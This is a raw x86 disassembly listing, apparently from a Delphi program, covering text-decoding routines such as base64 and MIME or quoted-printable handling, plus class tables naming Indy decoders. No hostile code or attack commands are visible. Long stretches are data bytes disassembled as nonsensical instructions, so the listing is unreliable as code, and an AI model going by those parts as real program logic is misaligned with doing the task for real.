mov edx [ ebp - 0x24 ]
mov eax r-xdata
call sub_404654
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x24 ]
call sub_404310
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov edx [ ebp - 0xc ]
inc edx
mov eax [ ebp - 0x24 ]
call sub_404570
cmp esi 0x1
jne r-xdata
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x24 ]
call sub_404310
mov edx eax
dec edx
mov ecx 0x2
mov eax [ ebp - 0x24 ]
call sub_404570
mov eax [ ebp - 0x40 ]
mov edx r-xdata
call sub_40445c
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x10 ]
call sub_407ddc
test al al
je r-xdata
mov [ ebp - 0x25 ] 0x0
cmp [ ebp - 0x25 ] 0x0
je r-xdata
cmp [ ebp - 0x25 ] 0x0
je r-xdata
cmp [ ebp - 0x25 ] 0x0
je r-xdata
jmp r-xdata
mov esi 0x1
lea eax [ ebp - 0x18 ]
call sub_404050
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_407ddc
test al al
je r-xdata
mov eax [ ebp - 0x24 ]
call sub_404310
cmp eax 0x4
jge r-xdata
mov eax [ ebp - 0x24 ]
cmp [ eax + esi - 0x1 ] 0x3d
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_404318
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x18 ]
call sub_4040e8
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x18 ]
call sub_46af50
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov al [ eax ]
call sub_46a8a8
mov [ ebp - 0x1f ] al
mov eax [ ebp - 0x24 ]
mov al [ eax + 0x1 ]
call sub_46a8a8
mov [ ebp - 0x1e ] al
mov eax [ ebp - 0x24 ]
mov al [ eax + 0x2 ]
call sub_46a8a8
mov [ ebp - 0x1d ] al
mov eax [ ebp - 0x24 ]
mov al [ eax + 0x3 ]
call sub_46a8a8
mov [ ebp - 0x1c ] al
mov dl [ ebp - 0x1f ]
shl edx 0x2
mov al [ ebp - 0x1e ]
xor ecx ecx
mov cl al
shr ecx 0x4
or dl cl
mov [ ebp - 0x1b ] dl
shl eax 0x4
xor edx edx
mov dl [ ebp - 0x1d ]
shr edx 0x2
or al dl
mov [ ebp - 0x1a ] al
mov al [ ebp - 0x1d ]
shl eax 0x6
xor edx edx
mov dl [ ebp - 0x1c ]
shr edx 0x0
or al dl
mov [ ebp - 0x19 ] al
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x24 ]
call sub_404310
mov ecx eax
mov edx 0x5
mov eax [ ebp - 0x24 ]
call sub_404570
push [ ebp - 0x18 ]
lea eax [ ebp - 0x5c ]
mov dl [ ebp - 0x1b ]
call sub_404238
push [ ebp - 0x5c ]
lea eax [ ebp - 0x60 ]
mov dl [ ebp - 0x1a ]
call sub_404238
push [ ebp - 0x60 ]
lea eax [ ebp - 0x64 ]
mov dl [ ebp - 0x19 ]
call sub_404238
push [ ebp - 0x64 ]
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_4043d0
lea eax [ ebp - 0x58 ]
mov edx [ ebp - 0x24 ]
mov dl [ edx + esi - 0x1 ]
call sub_404238
mov edx [ ebp - 0x58 ]
lea eax [ ebp - 0x18 ]
call sub_404318
mov eax [ ebp - 0x24 ]
call sub_404310
lea edx [ esi + 0x4 ]
cmp eax edx
jl r-xdata
inc esi
mov eax [ ebp - 0x24 ]
cmp [ eax + esi - 0x1 ] 0x3f
jne r-xdata
lea eax [ ebp - 0x68 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404570
push [ ebp - 0x68 ]
push [ ebp - 0x24 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404310
mov ecx eax
lea edx [ edi + 0x2 ]
mov eax [ ebp - 0x4 ]
call sub_404570
push [ ebp - 0x6c ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4043d0
lea eax [ ebp - 0x24 ]
call sub_404050
mov eax [ ebp - 0x24 ]
cmp [ eax + esi - 0x1 ] 0x5f
jne r-xdata
mov eax [ ebp - 0x24 ]
cmp [ eax + esi ] 0x3d
jne r-xdata
mov edx r-xdata
lea eax [ ebp - 0x4c ]
call sub_402b88
lea eax [ ebp - 0x50 ]
mov edx [ ebp - 0x24 ]
mov dl [ edx + esi ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x50 ]
lea eax [ ebp - 0x4c ]
mov cl 0x2
call sub_402b58
lea edx [ ebp - 0x4c ]
lea eax [ ebp - 0x54 ]
call sub_402b88
lea eax [ ebp - 0x50 ]
mov edx [ ebp - 0x24 ]
mov dl [ edx + esi + 0x1 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x50 ]
lea eax [ ebp - 0x54 ]
mov cl 0x3
call sub_402b58
lea edx [ ebp - 0x54 ]
lea eax [ ebp - 0x48 ]
call sub_4042b4
mov eax [ ebp - 0x48 ]
call sub_408084
mov edx eax
lea eax [ ebp - 0x44 ]
call sub_404238
mov edx [ ebp - 0x44 ]
lea eax [ ebp - 0x18 ]
call sub_404318
add esi 0x2
jmp r-xdata
jmp r-xdata
sub_46af50
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46b0d4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_404050
mov [ ebp - 0x9 ] 0x0
mov eax esi
call sub_404310
mov edi eax
mov ebx 0x1
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_4040a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b0db
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_404074
lea eax [ ebp - 0x8 ]
call sub_404050
retn
cmp [ esi + ebx - 0x1 ] 0x1b
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc ebx
lea eax [ ebx + 0x1 ]
cmp edi eax
jl r-xdata
lea eax [ ebp - 0x20 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404238
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x8 ]
call sub_404318
inc ebx
lea eax [ ebx + 0x1 ]
cmp edi eax
jl r-xdata
cmp edi ebx
jge r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x2
mov edx ebx
mov eax esi
call sub_404570
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40445c
jne r-xdata
inc ebx
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
mov dl [ esi + ebx ]
mov [ ebp - 0xa ] dl
xor edx edx
mov dl al
dec edx
shr edx 0x1
mov [ ebp - 0xb ] dl
cmp al 0x5f
jae r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x2
mov edx ebx
mov eax esi
call sub_404570
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_40445c
jne r-xdata
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
add [ ebp - 0xb ] 0xb1
add [ ebp - 0xb ] 0x71
jmp r-xdata
add ebx 0x2
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
add [ ebp - 0xa ] 0x7e
cmp [ ebp - 0xa ] 0x60
jae r-xdata
and eax 0xff
and eax 0x1
cmp eax 0x1
jne r-xdata
add [ ebp - 0xa ] 0x20
jmp r-xdata
add [ ebp - 0xa ] 0x1f
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x18 ]
mov dl [ ebp - 0xb ]
call sub_404238
push [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
mov dl [ ebp - 0xa ]
call sub_404238
push [ ebp - 0x1c ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4043d0
add ebx 0x2
jmp r-xdata
sub_46b0f3
inc [ edx ]
add [ eax ] al
add [ eax ] ch
inc edx
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b121
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b128
retn
sub_46b28c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xb2
inc esi
add [ eax ] cl
add [ eax ] al
add [ eax - 0x3bffbff0 ] bh
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] dh
mov ch 0x46
add [ 0x4d644954 ] dl
jae r-xdata
add [ esi + ebp * 4 - 0x4f33ffbf ] bl
inc ecx
popad
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ eax + 0x500e0004 ] al
jb r-xdata
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax - 0x49 ] ch
inc esi
add ah dh
fild [ ebp ]
sub al 0xe0
inc ebp
add [ eax + 0x45 ] bl
add [ eax + 0xe00402a ] dl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x680040 ] ch
add [ eax ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
dec ebp
jae r-xdata
add [ esi + ebx * 8 + 0x48500045 ] ch
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
imul esi [ ebx + 0x74 ] 0xb338c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4d ] bh
inc esi
add [ eax + 0x46b3 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x700046b3 ] cl
add [ eax ] al
add [ ebx * 8 - 0x4f4bffbb ] ch
inc ecx
add al dl
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
arpl [ edi + 0x64 ] bp
jb r-xdata
imul esi [ ebx + 0x73 ] 0x436e6f69
outsd
mov eax eax
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
lodsb [ esi ]
inc ecx
add [ edi + eax * 2 + 0x41 ] ch
mov bl 0x46
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
dec ebp
jae r-xdata
dec eax
xor al [ eax ]
fdiv [ esi + 0x54150046 ]
dec ecx
dec ebp
jae r-xdata
outsb
outsw
mov eax eax
aam 0xb4
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
mov ah 0x46
add [ eax ] cl
add [ eax ] al
add [ eax - 0x3bffbff0 ] bh
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add ah bl
mov dh 0x46
add [ 0x4d644954 ] dl
rcl [ ebx + 0x56 ] 0x84
shl [ eax + ecx - 0x7d ] cl
popad
inc ebp
outsb
push 0x46b4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
mov eax [ esi + 0x4 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403294
inc edi
dec ebp
jne r-xdata
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
outsb
popad
insd
push esp
mov bl 0x46
add ah al
fld [ ebp ]
add eax 0x64490e00
dec ebp
jae r-xdata
lea eax [ esi + 0x4 ]
call sub_40d19c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
push ebp
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
imul esi [ ebx + 0x74 ] 0x5653c08b
test dl dl
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x4c ] dh
inc esi
add [ eax ] cl
add [ eax ] al
add [ eax - 0x3bffbff0 ] bh
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi - 0x498bffc0 ] al
inc esi
add [ esi + esi * 4 + 0x54150046 ] dl
dec ecx
dec ebp
jae r-xdata
popad
inc ebx
outsd
jb r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
inc ebp
xor edi edi
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403264
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
adc [ eax ] al
insb
add [ eax ] al
[ eax + eax ]
adc [ eax ] al
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46080003 ] al
imul ebp [ ebp + 0x6e ] 0x54656d61
add [ eax + edx + 0x680040 ] ch
add bh bh
push 0x1ff0000
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46b3fc
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500e0004 ] al
jb r-xdata
arpl [ edi + 0x64 ] bp
jb r-xdata
imul esi [ ebx + 0x73 ] 0x436e6f69
outsd
mov eax eax
push 0x46b4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4c ] dh
inc esi
add [ eax ] cl
add [ eax ] al
add [ eax - 0x3bffbff0 ] bh
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi - 0x498bffc0 ] al
inc esi
add [ esi + esi * 4 + 0x54150046 ] dl
dec ecx
dec ebp
jae r-xdata
dec eax
xor al [ eax ]
fdiv [ esi + 0x54150046 ]
dec ecx
dec ebp
jae r-xdata
outsb
outsw
mov eax eax
aam 0xb4
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
mov ah 0x46
add [ eax ] cl
add [ eax ] al
add [ eax - 0x3bffbff0 ] bh
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add ah bl
mov dh 0x46
add [ 0x4d644954 ] dl
rcl [ ebx + 0x56 ] 0x84
shl [ eax + ecx - 0x7d ] cl
popad
inc ebp
outsb
mov eax [ esi + 0x4 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403294
inc edi
dec ebp
jne r-xdata
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
lea eax [ esi + 0x4 ]
call sub_40d19c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
push ebp
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
imul esi [ ebx + 0x74 ] 0x5653c08b
test dl dl
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
inc ebp
xor edi edi
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403264
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46b4ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403264
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46b530
push ebx
push esi
push edi
push ebp
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
lea eax [ esi + 0x4 ]
call sub_40d19c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
mov eax [ esi + 0x4 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403294
inc edi
dec ebp
jne r-xdata
sub_46b588
push ebx
push esi
mov esi ecx
mov ebx edx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov ecx esi
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b4ec
mov [ rw-data ] eax
sub_46b5dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45de14
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ esi + 0x6c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46b620
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
lea eax [ esi + 0x6c ]
call sub_40d19c
lea eax [ esi + 0x74 ]
call sub_40d19c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45deac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_46b698
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403264
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46b6dc
push ebx
push esi
push edi
push ebp
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
lea eax [ esi + 0x4 ]
call sub_40d19c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
mov eax [ esi + 0x4 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403294
inc edi
dec ebp
jne r-xdata
sub_46b734
push ebx
push esi
mov esi ecx
mov ebx edx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov ecx esi
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b698
mov [ rw-data ] eax
sub_46b768
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45de14
mov [ esi + 0x6c ] 0x294
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46b7a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b7df
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b7e6
retn
mov eax rw-data
call sub_40d19c
mov eax rw-data
call sub_40d19c
sub_46b9b1
mov bh 0x46
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x500041a9 ] dl
dec eax
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ ecx + ebp * 4 + 0x41 ] al
add [ ebp + edi * 4 + 0xe0046 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
xor [ eax ] al
add [ eax ] al
push cs
push esp
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
adc [ eax ] al
xor [ eax ] al
je r-xdata
scasd [ edi ]
add [ eax ] al
[ edi + 0x1ff0000 ]
je r-xdata
add al dh
mov edx 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc esi
imul ebp [ esp + ebp * 2 + 0x43 ] 0x8d726168
inc eax
xor al 0x8d
inc eax
add [ eax ] dh
mov edx 0xe070046
push esp
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
rol [ ebp - 0x47e5812e ] 0x1
add [ eax ] eax
add [ eax ] al
xor edx [ eax + r-xdata ]
pop es
push cs
push esp
dec ecx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add al [ eax ]
or eax [ ebx + 0x6f ]
imul ebp [ fs : esi + 0x67 ] 0x6c626154
sub [ gs : eax ] dl
inc eax
add [ eax + eax ] dh
add bh bh
je r-xdata
xor ecx ecx
mov cl [ ebx + eax - 0x1 ]
lea ecx [ esi + ecx - 0x1 ]
push ecx
pop edi
pop esi
pop ebx
retn
add [ eax ] cl
inc esi
imul ebp [ esp + ebp * 2 + 0x43 ] 0x90726168
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebx + 0x46 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xd4
mov ecx 0xb87c0046
inc esi
add [ eax + eax ] al
or ecx [ ecx + 0x64 ]
inc ebx
outsd
jb r-xdata
mov ecx eax
dec ecx
pop edi
mov [ edi ] cl
inc eax
dec edx
jne r-xdata
xor esi eax
mov edx 0xb92c0046
inc esi
add [ ebx ] al
add [ ebx ] cl
dec ecx
inc ebx
outsd
jb r-xdata
xor al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
or [ esi + 0x69 ] al
insb
insb
inc ebx
push 0x408d7261
je r-xdata
add [ eax ] al
mov edx esi
je r-xdata
and al 0xbb
inc esi
add [ eax - 0x60000000 ] dh
mov eax 0xb0b40046
inc ecx
add al dl
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x500041a9 ] dl
dec eax
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ ecx + ebp * 4 + 0x41 ] al
add ah al
mov ebx 0x540e0046
dec ecx
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x2
add [ eax + edx + 0x300040 ] ch
mov [ edx ] 0xff
inc edx
dec eax
jne r-xdata
mov eax ebx
call sub_404310
mov edx eax
test edx edx
jle r-xdata
add [ edx ] ch
xor al 0x1
add [ eax ] ch
adc [ eax ] al
mov eax 0x1
push 0x0
dec ecx
jne r-xdata
push 0x0
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_46bd43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404310
and eax 0x80000003
jns r-xdata
test eax eax
jle r-xdata
dec eax
or eax 0xfffffffc
inc eax
lea eax [ ebp - 0x18 ]
call sub_404050
mov eax [ ebp - 0x4 ]
call sub_404310
mov edi eax
mov ebx 0x1
lea eax [ ebp - 0x10 ]
call sub_404050
cmp edi ebx
jl r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
cmp [ ebp - 0x10 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
call j_sub_40451c
lea eax [ eax + ebx - 0x1 ]
lea edx [ ebp - 0x14 ]
mov ecx 0x4
call sub_4028e0
add ebx 0x4
lea eax [ ebp - 0xa ]
push eax
lea eax [ ebp - 0x9 ]
push eax
lea ecx [ ebp - 0xb ]
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_46bd54
mov dl [ ebp - 0x12 ]
mov al [ esi + 0xaf ]
cmp dl al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bd4a
lea eax [ ebp - 0x28 ]
mov edx 0x5
call sub_404074
lea eax [ ebp - 0x10 ]
call sub_404050
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax [ ebp - 0x10 ]
call sub_404310
push eax
lea eax [ ebp - 0x10 ]
call j_sub_40451c
mov edx eax
mov eax [ ebp - 0x8 ]
pop ecx
call sub_416890
mov dl [ ebp - 0x11 ]
cmp al dl
jne r-xdata
lea eax [ ebp - 0x20 ]
mov dl [ ebp - 0xb ]
call sub_404238
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_404318
jmp r-xdata
lea eax [ ebp - 0x28 ]
lea edx [ ebp - 0xb ]
mov ecx 0x3
call sub_404140
mov edx [ ebp - 0x28 ]
lea eax [ ebp - 0x10 ]
call sub_404318
lea eax [ ebp - 0x24 ]
lea edx [ ebp - 0xb ]
mov ecx 0x2
call sub_404140
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
call sub_404318
jmp r-xdata
cmp edi ebx
jge r-xdata
sub_46bb84
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov eax 0x7f
mov edx esi
mov [ edx ] 0xff
inc edx
dec eax
jne r-xdata
mov eax ebx
call sub_404310
mov edx eax
test edx edx
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax 0x1
xor ecx ecx
mov cl [ ebx + eax - 0x1 ]
lea ecx [ esi + ecx - 0x1 ]
push ecx
mov ecx eax
dec ecx
pop edi
mov [ edi ] cl
inc eax
dec edx
jne r-xdata
sub_46bbc4
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_46bd43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404310
and eax 0x80000003
jns r-xdata
test eax eax
jle r-xdata
dec eax
or eax 0xfffffffc
inc eax
